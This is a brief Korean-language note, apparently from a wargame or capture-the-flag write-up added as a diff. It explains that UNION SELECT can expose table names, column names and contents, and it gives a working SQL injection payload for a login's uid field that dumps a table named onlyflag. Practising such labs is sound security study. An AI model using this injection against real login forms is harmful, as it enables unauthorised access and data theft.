@@ -1,0 +1,8 @@
+UNION SELECT 문을 적절히 활용하면 테이블명과 컬럼명을 알 수 있고,
+마찬가지로 UNION SELECT 문을 활용해 테이블의 내용물을 조회할 수 있다.
+
+uid
+' or 1=2 union select sflag as idx, svalue as uid, sname as upw, sclose as descr from onlyflag; --
+
+upw
+a
